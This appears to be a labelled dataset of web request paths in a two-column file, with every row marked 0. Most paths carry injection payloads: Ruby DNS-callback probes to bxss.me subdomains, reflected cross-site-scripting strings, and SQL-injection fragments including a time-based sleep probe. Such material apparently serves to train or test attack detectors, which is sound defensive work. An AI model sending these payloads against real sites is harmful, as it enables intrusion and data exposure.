sentences	labels
socket.gethostbyname(""hithn"" ""iwcyplpfd267b.bxss.me."")[3].to_s) ""/***************/16/images/jquery.waterfall.js 	 0
socket.gethostbyname('hitqx' 'wcagrvvk4d467.bxss.me.')[3].to_s) '/****/7/12/art_35_234319.html 	 0
/******/system/2021/11/27/javascript:void(); 	 0
socket.gethostbyname('hitnp' 'sttuplrk424a2.bxss.me.')[3].to_s) '/**/images/autocomplete.css 	 0
/******/hhs/js/jquery.kinslideshow-1.2.1.min.js/""><script>alert(34)</script> 	 0
socket.gethostbyname(""hitld"" ""rwoptjvibaac2.bxss.me."")[3].to_s) ""/******/waterpull/pinterest_grid.js 	 0
/******/hhs/js/jquery-1.4a2.min.js/<img src="javascript:alert(50)"> 	 0
socket.gethostbyname('hitjq' 'zaycmiwga6fb9.bxss.me.')[3].to_s) '/*****/grouppic/jquery.ad-gallery.js 	 0
socket.gethostbyname(""hitde"" ""mluirsua1ba1e.bxss.me."")[3].to_s) ""/****/10/11/art_34_242318.html 	 0
socket.gethostbyname('hitcx' 'aetwgyshf3a9b.bxss.me.')[3].to_s) '/******/result.css 	 0
socket.gethostbyname('hitmx' 'htrncijocc232.bxss.me.')[3].to_s) '/******/zmhdyc.html 	 0
socket.gethostbyname('hitoi' 'kglbxleaf7bf3.bxss.me.')[3].to_s) '/**/art_34_242318.html 	 0
socket.gethostbyname(""hitvw"" ""svhrikna978d3.bxss.me."")[3].to_s) ""/***/easyui/plugins/jquery.panel.js 	 0
/******/system/2016/12/05/javascript:void(); 	 0
socket.gethostbyname(""hitvv"" ""tkecydzod2611.bxss.me."")[3].to_s) ""/***************/16/images/plugin/voice/hzrecorder.js 	 0
socket.gethostbyname('hitds' 'whdyamzq0c405.bxss.me.')[3].to_s) '/****/gdyx/ 	 0
/******/system/2018/02/25/javascript:window.print() 	 0
socket.gethostbyname(""hitih"" ""odvykjbx400e4.bxss.me."")[3].to_s) ""/****/110105008056111/16/images/plugin/voice/hzrecorder.js 	 0
/******/system/2020/10/01/javascript:void(0); 	 0
socket.gethostbyname('hitqp' 'lpnyaahv5ffcc.bxss.me.')[3].to_s) '/****/202011/t20201106_2279316.html 	 0
/******/system/2021/06/09/013399706'""/><script >alert(2291);</script >.shtml 	 0
/******/zsn/index.html/"><script>alert(334)</script> 	 0
socket.gethostbyname(""hitbp"" ""hprmrvybad890.bxss.me."")[3].to_s) ""/****/bmjs/qtdw/ 	 0
/******/n236753/n236781/c1556969'||'/content.html 	 0
/******/n42746/index'||'_244329_10.html 	 0
socket.gethostbyname(""hitbz"" ""lgqjbofgbf0de.bxss.me."")[3].to_s) ""/******/tjj/zfxxgkml_2127/hygq_2064/list.html 	 0
socket.gethostbyname(""hithx"" ""idvruowtd5dcb.bxss.me."")[3].to_s) ""/*****/voice.css 	 0
/******/lxqz/jb/"><script>alert(553)</script> 	 0
socket.gethostbyname('hitkd' 'fwxpzvdva57f3.bxss.me.')[3].to_s) '/****/list.html 	 0
/******/system/2016/02/29/javascript:window.close(); 	 0
/******/system/2016/03/02/javascript:window.print() 	 0
socket.gethostbyname('hitwv' 'asaulhyx94a73.bxss.me.')[3].to_s) '/*****/hfswsj/zmhdyc.html 	 0
socket.gethostbyname(""hitel"" ""crzuykif4f453.bxss.me."")[3].to_s) ""/***************/16/images/result.css 	 0
socket.gethostbyname('hitrf' 'rslqqevdca891.bxss.me.')[3].to_s) '/*******/jquery.panel.js 	 0
socket.gethostbyname('hitvc' 'qjhngaqfacbb7.bxss.me.')[3].to_s) '/**/images/main.css 	 0
socket.gethostbyname('hityg' 'axrimmwsd2d4d.bxss.me.')[3].to_s) '/******/searchbtn.js 	 0
socket.gethostbyname(""hityi"" ""rhekvivta103e.bxss.me."")[3].to_s) ""/******/ie6fixed/ie6fixed.js 	 0
/******/system/2019/08/27/javascript:window.print() 	 0
/******/lxqz/cx/"><script>alert(561)</script> 	 0
/******/system/2017/12/20/javascript:window.close(); 	 0
/******/system/2021/11/26/javascript:window.close(); 	 0
socket.gethostbyname(""hitla"" ""rrwjekob50e43.bxss.me."")[3].to_s) ""/**/widgets/scrollup/css/themes/image.css 	 0
/******/system/2021/09/13/javascript:window.print() 	 0
socket.gethostbyname(""hitxj"" ""smoajdhua2d6f.bxss.me."")[3].to_s) ""/********/jcse/110105008056111/16/images/plugin/analysis/jquery.windstagball.js 	 0
/******/system/2021/06/09'"/><iframe src=javascript:alert(2331) /013399706.shtml 	 0
/******/system/2021/06/09'""/>/</script/>/<svg/onload=alert(2371) width=100//>/013399706.shtml 	 0
/******/system/2017/07/05/javascript:void(0); 	 0
socket.gethostbyname(""hitsi"" ""vqekvqfse01d8.bxss.me."")[3].to_s) ""/******/t20210806_185416.html 	 0
socket.gethostbyname('hitqw' 'qynnbxhm93ba7.bxss.me.')[3].to_s) '/**/images/catesearchbtn.js 	 0
socket.gethostbyname(""hitaj"" ""hnwgpuosb9993.bxss.me."")[3].to_s) ""/**/images/plugin/voice/hzrecorder.js 	 0
socket.gethostbyname(""hitwp"" ""cmjbbqhpe424a.bxss.me."")[3].to_s) ""/****/ 	 0
socket.gethostbyname(""hitgv"" ""atyepoqcfb626.bxss.me."")[3].to_s) ""/****/list.html 	 0
/******/system/2017/10/28/javascript:window.close(); 	 0
socket.gethostbyname('hitaf' 'xnpjzolz0be83.bxss.me.')[3].to_s) '/**/images/ui.css 	 0
/******/n42821/n42825/n1588869'||'/c1589219/content.html 	 0
/******/system/2018/01/28/javascript:window.close(); 	 0
/******/system/2016/12/19/javascript:window.print() 	 0
/******/system/2021/12/21/javascript:window.close(); 	 0
socket.gethostbyname('hitwm' 'urffjzqs11013.bxss.me.')[3].to_s) '/******/list.html 	 0
socket.gethostbyname('hitne' 'cqvoatbv27e82.bxss.me.')[3].to_s) '/******/index.html 	 0
/¦¯¡ä¡Áor(if(now()=sysdate(),sleep(15),0))xor'z/**/encrypt/jbase64.js 	 0
socket.gethostbyname(""hitkh"" ""ibbotibv8416c.bxss.me."")[3].to_s) ""/**/lib/easyui/plugins/jquery.window.js 	 0
socket.gethostbyname('hitxz' 'cryipehm45601.bxss.me.')[3].to_s) '/*******/jquery.linkbutton.js 	 0
socket.gethostbyname(""hithd"" ""erqdcurh149e4.bxss.me."")[3].to_s) ""/**/images/result.css 	 0
/******/system/2016/09/14/javascript:window.print() 	 0
socket.gethostbyname('hitha' 'nofzfkuy3fc33.bxss.me.')[3].to_s) '/***************/16/images/result.css 	 0
socket.gethostbyname('hitpu' 'drnhirnd62037.bxss.me.')[3].to_s) '/**/images/common.js 	 0
/******/system/2019/11/25/javascript:window.print() 	 0
socket.gethostbyname(""hitpc"" ""bnayqclb6daa5.bxss.me."")[3].to_s) ""/****/110105008056111/16/images/css.js 	 0
socket.gethostbyname(""hitzk"" ""adjmyrmhaa66a.bxss.me."")[3].to_s) ""/*/xys.css 	 0
socket.gethostbyname(""hitwo"" ""kfxjlwrtb09d0.bxss.me."")[3].to_s) ""/********/jcse/110105008056111/16/images/main.css 	 0
socket.gethostbyname('hitqp' 'tgqlreona377f.bxss.me.')[3].to_s) '/********/jcse/110105008056111/16/images/plugin/waterpull/pinterest_grid.js 	 0
/******/zlhz/"><script>alert(189)</script> 	 0
socket.gethostbyname(""hitem"" ""kvfaqpsy44544.bxss.me."")[3].to_s) ""/*********/linkbutton.css 	 0
/******/system/2021/11/15/javascript:void(0); 	 0
/******/system/2020/10/12/javascript:void(0); 	 0
socket.gethostbyname('hityh' 'msasboncb276e.bxss.me.')[3].to_s) '/*******/jquery.parser.js 	 0
socket.gethostbyname(""hitlm"" ""sycvkumk52fef.bxss.me."")[3].to_s) ""/**/lib/security/sm2.js 	 0
socket.gethostbyname('hitib' 'bfbfapmab2330.bxss.me.')[3].to_s) '/***************/16/images/autocomplete.css 	 0
/******/qhkc/zj/<img src="javascript:alert(270)"> 	 0
